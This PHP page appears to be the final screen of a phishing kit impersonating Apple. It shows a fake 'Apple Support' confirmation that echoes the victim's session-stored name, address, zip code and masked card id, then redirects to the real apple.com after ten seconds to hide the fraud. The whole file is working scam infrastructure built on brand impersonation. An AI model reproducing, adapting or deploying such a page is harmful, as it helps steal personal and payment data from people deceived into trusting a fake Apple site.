<?php session_start() ?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<title>Apple - Complete</title>
	<link rel="icon" href="https://www.apple.com/favicon.ico">

	<!-- Bootstrap -->
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">

	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

	<style type="text/css">
		body{
			padding-top: 70px;
		}
		.active a{
			background: #333 !important;
			background-color: #333 !important;
		}
		li a{
			color: #fff !important;
		}
		.whatsapp-icon, .footer *, .icon-bar{
			color: #fff !important;
		}
		.footer {
			padding-top: 20px;
			height: 60px;
			background: rgba(0,0,0,0.8) !important;
		}
		.nav-apple {
			background-color: rgba(0,0,0,0.8) !important;
		}
		.btn-apple {
			padding: 5px 36px;
			text-decoration: none;
			background: #08c;
			border-radius: 16px;
			color: #fff;
			font-size: 9pt;
			border-style: solid;
			border-color: #08c;
		}
		.btn-apple:hover {
			background: #005a88 !important;
		}
		.nav {
			width: 100% !important;
			text-align: center !important;
		}
		.nav li {
			width: 10% !important;
		}
		.modal-el{width:100%;height:100%;margin:0;left:0;top:0;position:fixed;visibility:hidden;}
		#transparent_div{opacity:0.9!important;z-index:99998!important;background:black;}
		#modal_text{color:#fff!important;z-index:99999!important;background:transparent!important;padding:20%;text-align:center;}
	</style>
</head>
<body>
	<nav class="navbar navbar-default navbar-fixed-top nav-apple">
	  <div class="container">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
		  <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
			<span class="sr-only">Toggle navigation</span>
			<span class="icon-bar"></span
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
		  </button>
		  <a class="navbar-brand hide-md visible-xs" href="#"><i class="fa fa-5 fa-apple whatsapp-icon"></i></a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse nav-whatsapp" id="bs-example-navbar-collapse-1">
		  <ul class="nav navbar-nav">
			<li><a class="navbar-brand" href="#"><i class="fa fa-5 fa-apple whatsapp-icon"></i></a></li>
			<li class="active"><a href="#">Mac<span class="sr-only">(current)</span></a></li>
			<li><a href="#">iPad</a></li>
			<li><a href="#">iPhone</a></li>
			<li><a href="#">Watch</a></li>
			<li><a href="#">TV</a></li>
			<li><a href="#">Music</a></li>
			<li><a href="#">Support</a></li>
			<li><a href="#"><i class="fa fa-search"></i></a></li>
			<li><a href="#"><i class="fa fa-shopping-bag"></i></a></li>
		  </ul>
		  <ul class="nav navbar-nav navbar-right hide">
			<li><a href="#">Help</a></li>
			<li><a href="#">Contact</a></li>
		  </ul>
		</div><!-- /.navbar-collapse -->
	  </div><!-- /.container-fluid -->
	</nav>
	<div class="container">
		<h1 class="text-success text-center">Congratulation!</h1>
		<div class="row">
			<div class="col-xs-12 col-md-offset-3 col-md-6">
				<div class="alert alert-success">
					<p>
						Dear <b><?= $_SESSION['fullname'] ?></b>,<br><br> Your Apple ID information has been Updated<br><br>
						Name          : <b><?= $_SESSION['fullname'] ?></b><br><br>
						Address line  :	<b><?= $_SESSION['address'] ?>,<?= $_SESSION['city'] ?>,<?= $_SESSION['zip_code'] ?></b><br><br>
						Payment Method:	<b><?= $_SESSION['secured_card_id'] ?></b><br><br>
						Best regards,   <br><br>
						Apple Support <br><br>
					</p>
					<hr>
					<p class="text-center">
						<a href="https://www.apple.com/legal/privacy/" class="btn btn-primary">Go to home page</a>
					</p>
				</div>
			</div>
		</div>
	</div>
	<nav class="navbar navbar-fixed-bottom footer text-center">
		<p class="text-muted">Copyright © 2017 Apple Inc. All rights reserved.</p>	
	</nav>
	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
	<!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

	<script type="text/javascript">
		setTimeout(function(){
			window.location = "https://www.apple.com";
		}, 10000);
	</script>
</body>
</html>